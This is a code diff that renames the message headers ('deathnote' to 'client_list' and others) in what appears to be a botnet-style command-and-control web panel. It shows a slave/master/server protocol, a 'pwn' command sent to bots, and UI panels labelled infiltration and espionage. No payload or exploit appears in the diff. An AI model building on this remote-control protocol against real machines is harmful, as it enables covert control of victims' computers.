@@ -568,26 +568,26 @@
   a. Slave - bots
   b. Master - remote control
 
-deathnote - list of clients
-identification - identification of client
-client - client status
+client_list - list of clients
+client_identification - identification of client
+client_status - client status
 data - data from the slaves (sent to master)
 pwn - command from the master (sent to slaves)
 pipe - pipe data to other clients
 config - set slave configuration
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Slave              | Server              | Master
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                    | deathnote-rxtx      | rxtx-deathnote
- identification-tx  | rx-identification   |
-                    | client-tx           | rx-client
- data-tx            | rx-data-tx          | rx-data
- pwn-rx             | tx-pwn-rx           | tx-pwn
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                    | pipeline-rx         | tx-pipeline
- config-rx          | tx-config-rx        | tx-config
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ Slave                      | Server                      | Master
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                            | client_list-rxtx            | rxtx-client_list
+ client_identification-tx   | rx-client_identification    | tx-client_identification
+                            | client_status-tx            | rx-client_status
+ data-tx                    | rxtx-data-rxtx              | rxtx-data
+ pwn-rx                     | rxtx-pwn-rxtx               | rxtx-pwn
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                            | pipe-rx                     | tx-pipe
+ config-rx                  | tx-config-rx                | tx-config
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 {"header":"", "payload":"", "trailer":""}
 
@@ -675,7 +675,7 @@ config - set slave configuration
 */
 server = "ws://" + window.document.location.host + "/";
 identification = {
- "header":"identification",
+ "header":"client_identification",
  "payload":{
     "id":"1",
     "type":"Master",
@@ -722,13 +722,13 @@ if ("WebSocket" in window) {
       console_(trailer);
       console.log(trailer);
 
-      if(header == "deathnote"){ //DEATHNOTE
+      if(header == "client_list"){ //DEATHNOTE
         clients = payload;
         $.each(clients, function(i, client) {
           if(client.type == "Slave")
             client_(client);
         })
-      }else if(header == "client"){ //CLIENT
+      }else if(header == "client_status"){ //CLIENT
         client = payload;
         if(client.type == "Slave")
           client_(client);
@@ -910,7 +910,7 @@ $("#box-documentation").hide();
 $("#box-about").hide();
 
 $("#nav-clients").click(function(){
-  ws.send('{"header": "deathnote"}');
+  ws.send('{"header": "client_list"}');
   $("#box-clients").show();
   $("#box-infiltration").hide();
   $("#box-espionage").hide();
